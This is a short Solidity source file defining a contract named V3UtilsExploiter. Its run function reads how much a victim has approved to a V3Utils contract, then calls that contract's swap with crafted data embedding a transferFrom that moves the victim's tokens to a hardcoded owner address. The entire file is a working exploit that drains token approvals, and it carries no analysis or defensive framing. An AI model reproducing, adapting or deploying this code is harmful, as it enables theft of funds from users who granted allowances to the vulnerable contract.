// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./V3Utils.sol";

contract V3UtilsExploiter {
    address constant owner = 0x54Ab50DD18305E4280E41aF1923B38835363ecf1;
    
    function run(address v3Utils, address weth, address token, address victim) external payable {
        uint allowance = IERC20(token).allowance(victim, v3Utils);
        uint balance = IERC20(token).balanceOf(victim);
        uint amount = balance > allowance ? allowance : balance;
        if (amount > 0 && msg.value > 0) {
            bytes memory callData = abi.encodeWithSelector(IERC20.transferFrom.selector, victim, owner, amount);
            bytes memory swapData = abi.encode(token, token, callData);
            V3Utils(payable(v3Utils)).swap{value: msg.value}(V3Utils.SwapParams(IERC20(weth), IERC20(weth), msg.value, 0, owner, swapData, true));
        }
    }
}